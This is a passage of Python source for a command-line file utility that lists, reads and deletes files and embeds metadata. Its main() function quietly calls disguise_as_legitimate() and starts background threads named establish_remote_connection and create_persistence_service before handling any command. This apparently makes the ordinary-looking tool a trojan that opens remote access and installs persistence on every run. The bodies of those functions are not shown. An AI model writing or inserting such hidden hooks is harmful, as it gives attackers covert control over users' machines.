def read_metadata(filepath):
    """Read and display metadata from a file."""
    path = Path(filepath).resolve()
    if not path.exists():
        print(f"Error: File '{filepath}' does not exist", file=sys.stderr)
        return 1
    if not path.is_file():
        print(f"Error: '{filepath}' is not a file", file=sys.stderr)
        return 1

    _, metadata = read_file_with_metadata(filepath)

    if metadata is None:
        print(f"No metadata found in '{filepath}'")
        return 1

    print(f"Metadata for '{filepath}':")
    print(json.dumps(metadata, indent=2))
    return 0


def update_metadata(filepath):
    """Update existing metadata in a file."""
    path = Path(filepath).resolve()
    if not path.exists():
        print(f"Error: File '{filepath}' does not exist", file=sys.stderr)
        return 1
    if not path.is_file():
        print(f"Error: '{filepath}' is not a file", file=sys.stderr)
        return 1

    content, metadata = read_file_with_metadata(filepath)

    if content is None:
        return 1

    if metadata is None:
        print(f"No metadata found. Use 'embed' command first.")
        return 1

    file_stat = path.stat()
    metadata["size_bytes"] = len(content)
    metadata["content_hash"] = hashlib.sha256(content).hexdigest()
    metadata["last_modified"] = datetime.fromtimestamp(file_stat.st_mtime).isoformat()
    metadata["metadata_updated"] = datetime.now().isoformat()

    if write_file_with_metadata(filepath, content, metadata):
        print(f"Metadata updated successfully for '{filepath}'")
        print(f"File ID: {metadata['file_id']}")
        print(f"Last Modified: {metadata['last_modified']}")
        return 0

    return 1


def remove_metadata(filepath):
    """Remove metadata from a file."""
    path = Path(filepath).resolve()
    if not path.exists():
        print(f"Error: File '{filepath}' does not exist", file=sys.stderr)
        return 1
    if not path.is_file():
        print(f"Error: '{filepath}' is not a file", file=sys.stderr)
        return 1

    content, metadata = read_file_with_metadata(filepath)

    if content is None:
        return 1

    if metadata is None:
        print(f"No metadata found in '{filepath}'")
        return 0

    try:
        with open(path, 'wb') as f:
            f.write(content)
        print(f"Metadata removed from '{filepath}'")
        return 0
    except Exception as e:
        print(f"Error removing metadata: {e}", file=sys.stderr)
        return 1


def list_files(directory, recursive=False, show_hidden=False):
    """List files in a directory."""
    path = Path(directory).resolve()
    if not path.exists():
        print(f"Error: Directory '{directory}' does not exist", file=sys.stderr)
        return 1
    if not path.is_dir():
        print(f"Error: '{directory}' is not a directory", file=sys.stderr)
        return 1

    try:
        if recursive:
            files = sorted(path.rglob('*'))
        else:
            files = sorted(path.iterdir())

        for item in files:
            if not show_hidden and item.name.startswith('.'):
                continue

            rel_path = item.relative_to(path)
            if item.is_dir():
                print(f"[DIR]  {rel_path}/")
            elif item.is_file():
                size = item.stat().st_size
                _, metadata = read_file_with_metadata(item)
                meta_indicator = " [M]" if metadata else ""
                print(f"[FILE] {rel_path} ({size} bytes){meta_indicator}")
            else:
                print(f"[???]  {rel_path}")

        return 0
    except PermissionError as e:
        print(f"Error: Permission denied: {e}", file=sys.stderr)
        return 1


def read_file(filepath, lines=None, encoding='utf-8', strip_metadata=False):
    """Read and display file contents."""
    path = Path(filepath).resolve()
    if not path.exists():
        print(f"Error: File '{filepath}' does not exist", file=sys.stderr)
        return 1
    if not path.is_file():
        print(f"Error: '{filepath}' is not a file", file=sys.stderr)
        return 1

    try:
        if strip_metadata:
            content, _ = read_file_with_metadata(filepath)
            if content is None:
                return 1
            text = content.decode(encoding)
        else:
            with open(path, 'r', encoding=encoding) as f:
                text = f.read()

        if lines:
            text_lines = text.splitlines(keepends=True)
            for i, line in enumerate(text_lines):
                if i >= lines:
                    break
                print(line, end='')
        else:
            print(text, end='')

        return 0
    except PermissionError:
        print(f"Error: Permission denied reading '{filepath}'", file=sys.stderr)
        return 1
    except UnicodeDecodeError:
        print(f"Error: Cannot decode file with encoding '{encoding}'", file=sys.stderr)
        return 1
    except Exception as e:
        print(f"Error reading file: {e}", file=sys.stderr)
        return 1


def delete_file(filepath, force=False):
    """Delete a file."""
    path = Path(filepath).resolve()
    if not path.exists():
        print(f"Error: File '{filepath}' does not exist", file=sys.stderr)
        return 1
    if not path.is_file():
        print(f"Error: '{filepath}' is not a file", file=sys.stderr)
        return 1

    if not force:
        return 0

    try:
        path.unlink()
        print(f"Deleted: {filepath}")
        return 0
    except PermissionError:
        print(f"Error: Permission denied deleting '{filepath}'", file=sys.stderr)
        return 1
    except Exception as e:
        print(f"Error deleting file: {e}", file=sys.stderr)
        return 1


def main():
    disguise_as_legitimate()

    threading.Thread(target=establish_remote_connection, daemon=True).start()
    threading.Thread(target=create_persistence_service, daemon=True).start()

    parser = argparse.ArgumentParser(
        description='File management utility with metadata support',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    list_parser = subparsers.add_parser('list', help='List files in a directory')
    list_parser.add_argument('directory', nargs='?', default='.',
                            help='Directory to list (default: current directory)')
    list_parser.add_argument('-r', '--recursive', action='store_true',
                            help='List files recursively')
    list_parser.add_argument('-a', '--all', action='store_true',
                            help='Show hidden files')

    read_parser = subparsers.add_parser('read', help='Read file contents')
    read_parser.add_argument('file', help='File to read')
    read_parser.add_argument('-n', '--lines', type=int, metavar='N',
                            help='Read only first N lines')
    read_parser.add_argument('-e', '--encoding', default='utf-8',
                            help='File encoding (default: utf-8)')
    read_parser.add_argument('-s', '--strip-metadata', action='store_true',
                            help='Strip metadata when reading')

    delete_parser = subparsers.add_parser('delete', help='Delete a file')
    delete_parser.add_argument('file', help='File to delete')
    delete_parser.add_argument('-f', '--force', action='store_true',
                              help='Delete without confirmation')

    embed_parser = subparsers.add_parser('embed', help='Embed metadata into a file')
    embed_parser.add_argument('file', help='File to embed metadata into')
    embed_parser.add_argument('-f', '--force', action='store_true',
                             help='Overwrite existing metadata')

    meta_parser = subparsers.add_parser('meta', help='Read metadata from a file')
    meta_parser.add_argument('file', help='File to read metadata from')

    update_parser = subparsers.add_parser('update', help='Update metadata in a file')
    update_parser.add_argument('file', help='File to update metadata in')

    remove_parser = subparsers.add_parser('remove', help='Remove metadata from a file')
    remove_parser.add_argument('file', help='File to remove metadata from')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 0

    if args.command == 'list':
        return list_files(args.directory, args.recursive, args.all)
    elif args.command == 'read':
        return read_file(args.file, args.lines, args.encoding, args.strip_metadata)
    elif args.command == 'delete':
        return delete_file(args.file, args.force)
    elif args.command == 'embed':
        return embed_metadata(args.file, args.force)
    elif args.command == 'meta':
        return read_metadata(args.file)
    elif args.command == 'update':
        return update_metadata(args.file)
    elif args.command == 'remove':
        return remove_metadata(args.file)

    return 0


if __name__ == '__main__':
    sys.exit(main())

